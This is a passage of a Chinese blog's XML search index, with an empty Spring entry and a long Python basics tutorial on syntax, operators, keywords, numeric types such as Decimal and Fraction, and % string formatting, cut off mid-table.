<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Spring全家桶</title>
    <url>/20230319/6a5a5c18.html</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>后端</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title>Python基础</title>
    <url>/20231106/99832f47.html</url>
    <content><![CDATA[<h1><a href="https://docs.python.org/zh-cn/3.11/reference/lexical_analysis.html#">语法</a></h1>
<h2 id="编码声明">编码声明</h2>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="运算符">运算符</h2>
<p>运算符列表</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">+       -       *       **      /       //      %      @
&lt;&lt;      &gt;&gt;      &amp;       |       ^       ~       :=
&lt;       &gt;       &lt;=      &gt;=      ==      !=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>符号</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>+</td>
<td>加法</td>
<td></td>
</tr>
<tr>
<td>-</td>
<td>减法</td>
<td></td>
</tr>
<tr>
<td>*</td>
<td>乘法</td>
<td></td>
</tr>
<tr>
<td>/</td>
<td>除法，总是返回浮点数</td>
<td></td>
</tr>
<tr>
<td>x ** y</td>
<td><em>x</em> 的 <em>y</em> 次幂</td>
<td>&gt;&gt;&gt; 5 ** 2 25</td>
</tr>
<tr>
<td>x // y</td>
<td>x 除以 y 的商数</td>
<td>&gt;&gt;&gt; 5 // 2 2</td>
</tr>
<tr>
<td>x % 5</td>
<td>x 除以 y 的余数</td>
<td></td>
</tr>
<tr>
<td>-x</td>
<td><em>x</em> 取反</td>
<td></td>
</tr>
<tr>
<td>+x</td>
<td><em>x</em> 不变</td>
<td></td>
</tr>
</tbody>
</table>
<p>交互模式下，上次输出的表达式会赋给变量 <code>_</code>。把 Python 当作计算器时，用该变量实现下一步计算更简单，例如：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> tax <span class="token operator">=</span> <span class="token number">12.5</span> <span class="token operator">/</span> <span class="token number">100</span>

<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> price <span class="token operator">=</span> <span class="token number">100.50</span>

<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> price <span class="token operator">*</span> tax

<span class="token number">12.5625</span>

<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> price <span class="token operator">+</span> _

<span class="token number">113.0625</span>

<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin">round</span><span class="token punctuation">(</span>_<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>

<span class="token number">113.06</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最好把该变量 <code>_</code>当作只读类型。不要为它显式赋值，否则会创建一个同名独立局部变量，该变量会用它的魔法行为屏蔽内置变量。</p>
<h2 id="分隔符">分隔符</h2>
<p>以下形符在语法中为分隔符：</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">(       )       [       ]       {       }

,       :       .       ;       @       =       -&gt;

+=      -=      *=      /=      //=     %=      @=

&amp;=      |=      ^=      &gt;&gt;=     &lt;&lt;=     **=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>句点也可以用于浮点数和虚数字面值。</p>
<p>三个连续句点表示省略符。</p>
<p>列表后半部分是增强赋值操作符，用作词法分隔符，但也可以执行运算。</p>
<p>以下 ASCII 字符具有特殊含义，对词法分析器有重要意义：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">'       "       <span class="token comment">#       \</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>以下 ASCII 字符不用于 Python。在字符串字面值或注释外使用时，将直接报错：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">$       ?       `<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="关键字">关键字</h2>
<p>关键字、软关键字、保留的标识符类</p>
<h3 id="关键字-2">关键字</h3>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">False      await      else       import     pass
None       break      except     in         raise
True       class      finally    is         return
and        continue   for        lambda     try
as         def        from       nonlocal   while
assert     del        global     not        with
async      elif       if         or         yield<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="软关键字">软关键字</h3>
<p>某些标识符仅在特定上下文中被保留。 它们被称为 <em>软关键字</em>。</p>
<p><code>match</code>, <code>case</code> 和 <code>_</code> 等标识符在模式匹配语句相关的上下文中具有相当于关键字的语义，但这种区分是在解析器层级完成，而不是在形符化的时候。</p>
<p>作为软关键字，它们能够与模式匹配一起使用，同时仍然保持与使用 <code>match</code>, <code>case</code> 和 <code>_</code> 作为标识符名称的现有代码的兼容性。</p>
<h3 id="保留的标识符类">保留的标识符类</h3>
<p>某些标识符类（除了关键字）具有特殊含义。这些类的命名模式以下划线字符开头，并以下划线结尾：</p>
<table>
<thead>
<tr>
<th>标识符</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>_*</code></td>
<td>不会被 from module import * 所导入。</td>
</tr>
<tr>
<td><code>_</code></td>
<td>在 match 语句内部的 case 模式中，_ 是一个 软关键字，它表示 通配符。<br>在此之外，交互式解释器会将最后一次求值的结果放到变量 _ 中。 （它与 print 等内置函数一起被存储于 builtins 模块。）<br>在其他地方，_ 是一个常规标识符。 <br>它常常被用来命名 “特殊” 条目，但对 Python 本身来说毫无特殊之处。如<code>_</code> 常用于连接国际化文本；详见 gettext 模块文档。<br>它还经常被用来命名无需使用的变量。</td>
</tr>
<tr>
<td><code>__*__</code></td>
<td>系统定义的名称，通常简称为 “dunder” 。这些名称由解释器及其实现（包括标准库）定义。<br>现有系统定义名称相关的论述详见 <a href="https://docs.python.org/zh-cn/3.11/reference/datamodel.html#specialnames">特殊方法名称</a> 等章节。Python 未来版本中还将定义更多此类名称。任何情况下，<em>任何</em> 不显式遵从 <code>__*__</code> 名称的文档用法，都可能导致无警告提示的错误。</td>
</tr>
<tr>
<td><code>__*</code></td>
<td>类的私有名称。类定义时，此类名称以一种混合形式重写，以避免基类及派生类的 “私有” 属性之间产生名称冲突。详见 标识符（名称）。</td>
</tr>
</tbody>
</table>
<h1>数据类型和变量</h1>
<p>整数、浮点数、字符串、布尔值、空值、列表、字典等</p>
<h2 id="整数-int">整数:<a href="https://docs.python.org/zh-cn/3.11/library/functions.html#int"><code>int</code></a></h2>
<p>Python允许在数字中间以<code>_</code>分隔，因此，写成<code>10_000_000_000</code>和<code>10000000000</code>是完全一样的</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 交互窗口输入（默认10进制）</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'输入数字：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
输入数字：<span class="token number">123</span>
<span class="token number">123</span>

<span class="token comment"># 指定2进制数据转化为10进制</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'11'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> 
<span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="浮点数">浮点数</h2>
<h3 id="float"><a href="https://docs.python.org/zh-cn/3.11/library/functions.html#float"> <code>float</code></a></h3>
<p>如果该参数是一个字符串，在去除前导和尾随的空格之后，输入必须为符合以下语法的 <code>floatvalue</code> 产生规则:</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">sign        ::=  "+" | "-"
infinity    ::=  "Infinity" | "inf"
nan         ::=  "nan"
digitpart   ::=  digit (["_"] digit)*
number      ::=  [digitpart] "." digitpart | digitpart ["."]
exponent    ::=  ("e" | "E") ["+" | "-"] digitpart
floatnumber ::=  number [exponent]
floatvalue  ::=  [sign] (floatnumber | infinity | nan)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<table>
<thead>
<tr>
<th>符号标记</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>sign ::= “+”</td>
<td>正，负</td>
<td>&gt;&gt;&gt; float(‘+1.23’) <br>1.23<br>&gt;&gt;&gt; float(‘-1.23\n’)  <br>-1.23<br>&gt;&gt;&gt; float(‘-123\n’)   <br>-123.0</td>
</tr>
<tr>
<td>(“e” | “E”) [“+” | “-”] 数字部分</td>
<td>科学计数</td>
<td>&gt;&gt;&gt; float(1e3)<br>1000.0 <br>&gt;&gt;&gt; float(‘1e3’)<br>1000.0 <br>&gt;&gt;&gt; float(‘1e+3’)<br>1000.0 <br>&gt;&gt;&gt; float(‘+1e3’)<br>1000.0 <br>&gt;&gt;&gt; float(‘-1e3’)<br>-1000.0 <br>&gt;&gt;&gt; float(‘1e-3’)<br>0.001 <br>&gt;&gt;&gt; float(1e-3)<br>0.001 <br>&gt;&gt;&gt; float(1E-3)<br>0.001</td>
</tr>
<tr>
<td>infinity ::= “Infinity” | “inf”</td>
<td>无穷大<br>1. 大小写不敏感<br>2.  需要为字符串，否则会报错</td>
<td>&gt;&gt;&gt; float(‘Infinity’)<br>inf<br>&gt;&gt;&gt; float(‘InfinitY’)<br>inf<br>&gt;&gt;&gt; float(‘-Inf’)<br>-inf</td>
</tr>
<tr>
<td>not-a-number</td>
<td>NaN<br>1. 大小写不敏感<br>2. 需要为字符串，否则会报错</td>
<td>&gt;&gt;&gt; float(‘NAN’)<br>nan<br>&gt;&gt;&gt; float(‘NaN’)<br>nan<br>&gt;&gt;&gt; float(‘-nan’)<br>nan</td>
</tr>
</tbody>
</table>
<h3 id="complex-：复数"><a href="https://docs.python.org/zh-cn/3.11/library/stdtypes.html#typesnumeric"><code>complex</code></a> ：复数</h3>
<p>后缀 <code>j</code> 或 <code>J</code> 用于表示虚数（例如 <code>3+5j</code> ）</p>
<table>
<thead>
<tr>
<th></th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody>
<tr>
<td>complex(re, im)</td>
<td>一个带有实部 <em>re</em> 和虚部 <em>im</em> 的复数。 <em>im</em> 默认为0</td>
<td>&gt;&gt;&gt; complex(3, 2)<br>(3+2j)</td>
</tr>
<tr>
<td>c.conjugate()</td>
<td>复数 <em>c</em> 的共轭</td>
<td>&gt;&gt;&gt; complex(3, 2).conjugate()<br>(3-2j)</td>
</tr>
</tbody>
</table>
<h3 id="Decimal：十进制浮点运算"><a href="https://docs.python.org/zh-cn/3.11/library/decimal.html#decimal-objects"><code>Decimal</code></a>：十进制浮点运算</h3>
<p><em>class</em> decimal.<strong>Decimal</strong>(<em>value=‘0’</em>, <em>context=None</em>)</p>
<p><em>value</em> 可以是整数，字符串，元组，<a href="https://docs.python.org/zh-cn/3.11/library/functions.html#float"><code>float</code></a> ，或另一个 <a href="https://docs.python.org/zh-cn/3.11/library/decimal.html#decimal.Decimal"><code>Decimal</code></a> 对象。 如果没有给出 <em>value</em>，则返回 <code>Decimal('0')</code>。</p>
<p>如果 <em>value</em> 是一个字符串，它应该在前导和尾随空格字符以及下划线被删除之后符合十进制数字字符串语法</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">from</span> decimal <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token comment"># 因为浮点数据的不准确性</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Decimal<span class="token punctuation">(</span><span class="token number">1.2</span><span class="token punctuation">)</span>
Decimal<span class="token punctuation">(</span><span class="token string">'1.1999999999999999555910790149937383830547332763671875'</span><span class="token punctuation">)</span>

<span class="token comment"># 通过设定有效数字，限定结果样式，保留六个有效数字</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> getcontext<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>prec <span class="token operator">=</span> <span class="token number">6</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Decimal<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span>Decimal<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
Decimal<span class="token punctuation">(</span><span class="token string">'0.142857'</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Decimal<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token operator">/</span>Decimal<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> 
Decimal<span class="token punctuation">(</span><span class="token string">'142.857'</span><span class="token punctuation">)</span>

<span class="token comment"># 四舍五入，保留两位小数</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Decimal<span class="token punctuation">(</span><span class="token string">'50.5679'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>quantize<span class="token punctuation">(</span>Decimal<span class="token punctuation">(</span><span class="token string">'0.00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
Decimal<span class="token punctuation">(</span><span class="token string">'50.57'</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Decimal<span class="token punctuation">(</span><span class="token string">'50.5'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>quantize<span class="token punctuation">(</span>Decimal<span class="token punctuation">(</span><span class="token string">'0.00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    
Decimal<span class="token punctuation">(</span><span class="token string">'50.50'</span><span class="token punctuation">)</span>

<span class="token comment"># Decimal 结果转化为string</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">(</span>Decimal<span class="token punctuation">(</span><span class="token string">'50.5679'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>quantize<span class="token punctuation">(</span>Decimal<span class="token punctuation">(</span><span class="token string">'0.00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  
<span class="token string">'50.57'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">取整问题：
ROUND_CEILING 总是趋向无穷大向上取整
ROUND_DOWN　总是趋向0取整
ROUND_FLOOR 总是趋向负无穷大向下取整
ROUND_HALF_DOWN　如果最后一个有效数字大于或等于5则朝0反方向取整；否则，趋向0取整
ROUND_HALF_EVEN　类似于ROUND_HALF_DOWN，不过，如果最后一个有效数字值为5，则会检查前一位。
偶数值会导致结果向下取整，奇数值导致结果向上取整
ROUND_HALF_UP 类似于ROUND_HALF_DOWN，不过如果最后一位有效数字为5，值会朝0的反方向取整
ROUND_UP　朝0的反方向取整
ROUND_05UP　如果最后一位是0或5，则朝0的反方向取整；否则向0取整<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="fractions-—-分数"><a href="https://docs.python.org/zh-cn/3.11/library/fractions.html#module-fractions"><code>fractions</code></a> — 分数</h3>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">from</span> fractions <span class="token keyword">import</span> Fraction
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token string">'1/3'</span><span class="token punctuation">)</span><span class="token operator">*</span>Fraction<span class="token punctuation">(</span><span class="token string">'3/1'</span><span class="token punctuation">)</span> 
Fraction<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">(</span>Fraction<span class="token punctuation">(</span><span class="token string">'1/3'</span><span class="token punctuation">)</span><span class="token operator">*</span>Fraction<span class="token punctuation">(</span><span class="token string">'3/1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token number">1</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">(</span>Fraction<span class="token punctuation">(</span><span class="token string">'1/3'</span><span class="token punctuation">)</span><span class="token operator">*</span>Fraction<span class="token punctuation">(</span><span class="token string">'6/2'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   
<span class="token number">1</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token builtin">int</span><span class="token punctuation">(</span>Fraction<span class="token punctuation">(</span><span class="token string">'1/3'</span><span class="token punctuation">)</span><span class="token operator">*</span>Fraction<span class="token punctuation">(</span><span class="token string">'6/1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token number">2</span>


<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token string">'3/7'</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token string">' -3/7 '</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token string">'1.414213 \t\n'</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">1414213</span><span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token number">1414213</span><span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">1414213</span><span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token string">'-.125'</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token string">'7e-6'</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token number">2.25</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token number">1.1</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">2476979795053773</span><span class="token punctuation">,</span> <span class="token number">2251799813685248</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token number">2476979795053773</span><span class="token punctuation">,</span> <span class="token number">2251799813685248</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">2476979795053773</span><span class="token punctuation">,</span> <span class="token number">2251799813685248</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">from</span> decimal <span class="token keyword">import</span> Decimal
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span>Decimal<span class="token punctuation">(</span><span class="token string">'1.1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> Fraction<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>
Fraction<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="字符串">字符串</h2>
<p>可以用成对的单引号、双引号、三重引号来表示</p>
<p>字符串由<a href="https://docs.python.org/zh-cn/3.11/library/stdtypes.html#str"><code>str</code></a> 类型表示。</p>
<ol>
<li>
<p>如果不希望前置 <code>\</code> 的字符转义成特殊字符，可以使用 <em>原始字符串</em>，在引号前添加 <code>r</code> 即可：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'C:\some\name'</span><span class="token punctuation">)</span>
C<span class="token punctuation">:</span>\some
ame
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">r'C:\some\name'</span><span class="token punctuation">)</span>
C<span class="token punctuation">:</span>\some\name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>原始字符串还有一个微妙的限制：一个原始字符串不能以奇数个 <code>\</code> 字符结束</p>
<p>以奇数个反斜杠结尾的原始字符串将会转义用于标记字符串的引号</p>
<p>请参阅 <a href="https://docs.python.org/zh-cn/3.11/faq/programming.html#faq-programming-raw-string-backslash">此 FAQ 条目</a> 了解更多信息及绕过的办法。</p>
</li>
<li>
<p>字符串字面值可以多行。使用三重引号：“”“…”“” 或 ‘’‘…’‘’</p>
</li>
</ol>
<h3 id="格式化字符串">格式化字符串</h3>
<h4 id="占位符">占位符</h4>
<p>用<code>%</code>实现。当<code>%</code>作为普通字符时，用<code>%%</code>来表示一个<code>%</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 只有一个占位符，括号可以省略</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token string">'Hello, %s'</span> <span class="token operator">%</span> <span class="token string">'world'</span>
<span class="token string">'Hello, world'</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token string">'Hi, %s, you have $%d.'</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">'Michael'</span><span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span>
<span class="token string">'Hi, Michael, you have $1000000.'</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Hi, %s, you have $%d. %f'</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">'Michael'</span><span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">,</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
Hi<span class="token punctuation">,</span> Michael<span class="token punctuation">,</span> you have $<span class="token number">1000000.</span> <span class="token number">1.000000</span>

<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'percent: %d%%'</span> <span class="token operator">%</span> <span class="token number">1</span><span class="token punctuation">)</span>  
percent<span class="token punctuation">:</span> <span class="token number">1</span><span class="token operator">%</span>


<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'percent: %.2f%%'</span> <span class="token operator">%</span> <span class="token number">1.345</span><span class="token punctuation">)</span>  
percent<span class="token punctuation">:</span> <span class="token number">1.34</span><span class="token operator">%</span>

<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'percent: %.2f%%'</span> <span class="token operator">%</span> <span class="token number">1.346</span><span class="token punctuation">)</span> 
percent<span class="token punctuation">:</span> <span class="token number">1.35</span><span class="token operator">%</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>常见的占位符有：</p>
<table>
<thead>
<tr>
<th>符号</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>%d</td>
<td>整数</td>
</tr>
<tr>
<td>%f</td>
<td>浮点数</td>
</tr>
<tr>
<td>%s</td>
